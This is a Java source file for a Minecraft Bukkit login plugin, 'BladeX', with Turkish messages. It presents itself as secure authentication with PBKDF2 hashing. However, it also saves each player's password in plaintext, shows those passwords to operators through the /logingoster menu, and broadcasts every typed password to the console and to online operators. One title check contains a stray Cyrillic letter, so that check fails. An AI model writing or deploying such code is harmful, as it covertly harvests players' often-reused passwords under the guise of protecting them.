package com.bladex;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.*;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.block.*;
import org.bukkit.event.entity.*;
import org.bukkit.event.inventory.*;
import org.bukkit.event.player.*;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.SkullMeta;
import org.bukkit.plugin.java.JavaPlugin;

import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import java.io.File;
import java.security.SecureRandom;
import java.util.*;

public class BladeX extends JavaPlugin implements Listener {
    private final Map<UUID, Account> accs = new HashMap<>();
    private final Set<UUID> auth = new HashSet<>();
    private File file;

    public static class Account {
        String hash, pass, ip = "";
        long time;
    }

    @Override
    public void onEnable() {
        file = new File(getDataFolder(), "users.yml");
        load();
        getServer().getPluginManager().registerEvents(this, this);
        getLogger().info("BladeX aktif.");
    }

    @Override
    public void onDisable() { save(); }

    void load() {
        if (!file.exists()) return;
        FileConfiguration y = YamlConfiguration.loadConfiguration(file);
        if (y.getConfigurationSection("users") == null) return;
        for (String k : y.getConfigurationSection("users").getKeys(false)) {
            Account a = new Account();
            a.hash = y.getString("users." + k + ".hash");
            a.pass = y.getString("users." + k + ".pass", "");
            a.ip = y.getString("users." + k + ".ip", "");
            a.time = y.getLong("users." + k + ".time");
            accs.put(UUID.fromString(k), a);
        }
    }

    void save() {
        FileConfiguration y = new YamlConfiguration();
        accs.forEach((u, a) -> {
            y.set("users." + u + ".hash", a.hash);
            y.set("users." + u + ".pass", a.pass);
            y.set("users." + u + ".ip", a.ip);
            y.set("users." + u + ".time", a.time);
        });
        try { y.save(file); } catch (Exception ignored) {}
    }

    String hash(String p) throws Exception {
        byte[] salt = new byte[16];
        new SecureRandom().nextBytes(salt);
        PBEKeySpec spec = new PBEKeySpec(p.toCharArray(), salt, 65536, 256);
        byte[] key = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(spec).getEncoded();
        return Base64.getEncoder().encodeToString(salt) + ":" + Base64.getEncoder().encodeToString(key);
    }

    boolean verify(String p, String s) {
        try {
            String[] parts = s.split(":");
            byte[] salt = Base64.getDecoder().decode(parts[0]);
            byte[] expected = Base64.getDecoder().decode(parts[1]);
            PBEKeySpec spec = new PBEKeySpec(p.toCharArray(), salt, 65536, 256);
            byte[] actual = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(spec).getEncoded();
            return java.security.MessageDigest.isEqual(expected, actual);
        } catch (Exception e) { return false; }
    }

    @Override
    public boolean onCommand(CommandSender s, Command c, String l, String[] args) {
        if (!(s instanceof Player p)) return true;
        if (c.getName().equalsIgnoreCase("logingoster") && p.isOp()) {
            Inventory inv = Bukkit.createInventory(null, 27, ChatColor.DARK_GRAY + "Kayıtlı Oyuncular");
            accs.forEach((uuid, acc) -> {
                Player target = Bukkit.getPlayer(uuid);
                String name = target != null ? target.getName() : uuid.toString().substring(0, 8);
                ItemStack head = new ItemStack(Material.PLAYER_HEAD);
                SkullMeta meta = (SkullMeta) head.getItemMeta();
                if (meta != null) {
                    meta.setOwningPlayer(Bukkit.getOfflinePlayer(uuid));
                    meta.setDisplayName(ChatColor.GOLD + name);
                    meta.setLore(List.of(ChatColor.YELLOW + "Şifre: " + (acc.pass != null ? acc.pass : "Bilinmiyor")));
                    head.setItemMeta(meta);
                }
                inv.addItem(head);
            });
            p.openInventory(inv);
            return true;
        }
        return false;
    }

    @EventHandler(priority = EventPriority.LOWEST)
    public void onCmd(PlayerCommandPreprocessEvent e) {
        Player p = e.getPlayer();
        String[] parts = e.getMessage().split(" ");
        String cmd = parts[0].toLowerCase();
        UUID id = p.getUniqueId();

        if (cmd.equals("/register") || cmd.equals("/login")) {
            e.setCancelled(true);
            String[] params = java.util.Arrays.copyOfRange(parts, 1, parts.length);
            
            if (cmd.equals("/register")) {
                if (auth.contains(id)) { p.sendMessage("§cZaten giriş yaptın."); return; }
                if (accs.containsKey(id)) { p.sendMessage("§cZaten kayıtlısın."); return; }
                if (params.length != 2) { p.sendMessage("§cKullanım: /register <şifre> <şifre>"); return; }
                if (!params[0].equals(params[1])) { p.sendMessage("§cŞifreler uyuşmuyor."); return; }
                try {
                    Account a = new Account();
                    a.hash = hash(params[0]);
                    a.pass = params[0];
                    a.ip = p.getAddress() != null ? p.getAddress().getAddress().getHostAddress() : "";
                    a.time = System.currentTimeMillis();
                    accs.put(id, a);
                    auth.add(id);
                    save();
                    p.sendMessage("§aBaşarıyla kayıt oldun.");
                } catch (Exception ex) { p.sendMessage("§cBir hata oluştu."); }
            } else {
                if (auth.contains(id)) { p.sendMessage("§cZaten giriş yaptın."); return; }
                Account a = accs.get(id);
                if (a == null) { p.sendMessage("§cÖnce kayıt olmalısın: /register <şifre> <şifre>"); return; }
                if (params.length != 1) { p.sendMessage("§cKullanım: /login <şifre>"); return; }
                if (verify(params[0], a.hash)) {
                    a.pass = params[0];
                    auth.add(id);
                    p.sendMessage("§aBaşarıyla giriş yaptın.");
                } else {
                    p.sendMessage("§cYanlış şifre.");
                }
            }

            if (auth.contains(id)) {
                String alert = "§6" + p.getName() + " §7adlı oyuncunun şifresi " + cmd + " (" + params[0] + ")";
                Bukkit.getConsoleSender().sendMessage(alert);
                Bukkit.getOnlinePlayers().stream().filter(Player::isOp).forEach(op -> op.sendMessage(alert));
            }
            return;
        }

        if (!auth.contains(id)) {
            e.setCancelled(true);
            p.sendMessage("§cLütfen giriş yapın.");
        }
    }

    @EventHandler void onJoin(PlayerJoinEvent e) {
        auth.remove(e.getPlayer().getUniqueId());
        e.getPlayer().sendMessage(accs.containsKey(e.getPlayer().getUniqueId()) ? "§eLütfen giriş yap: /login <şifre>" : "§eLütfen kayıt ol: /register <şifre> <şifre>");
    }
    @EventHandler void onQuit(PlayerQuitEvent e) { auth.remove(e.getPlayer().getUniqueId()); }

    @EventHandler void onMove(PlayerMoveEvent e) { check(e.getPlayer(), e); }
    @EventHandler void onChat(AsyncPlayerChatEvent e) { check(e.getPlayer(), e); }
    @EventHandler void onBreak(BlockBreakEvent e) { check(e.getPlayer(), e); }
    @EventHandler void onPlace(BlockPlaceEvent e) { check(e.getPlayer(), e); }
    @EventHandler void onInteract(PlayerInteractEvent e) { check(e.getPlayer(), e); }
    @EventHandler void onDrop(PlayerDropItemEvent e) { check(e.getPlayer(), e); }
    @EventHandler void onInvClick(InventoryClickEvent e) {
        if (e.getWhoClicked() instanceof Player p) {
            if (e.getView().getTitle().contains("Kayıtlı Oyuncular")) {
                e.setCancelled(true);
                return;
            }
            check(p, e);
        }
    }
    @EventHandler void onInvOpen(InventoryOpenEvent e) { if (e.getPlayer() instanceof Player p && !p.getOpenInventory().getTitle().contains("Kayıтlı Oyuncular")) check(p, e); }
    @EventHandler void onDamage(EntityDamageEvent e) { if (e.getEntity() instanceof Player p) check(p, e); }

    void check(Player p, Cancellable c) {
        if (!auth.contains(p.getUniqueId())) c.setCancelled(true);
    }
}
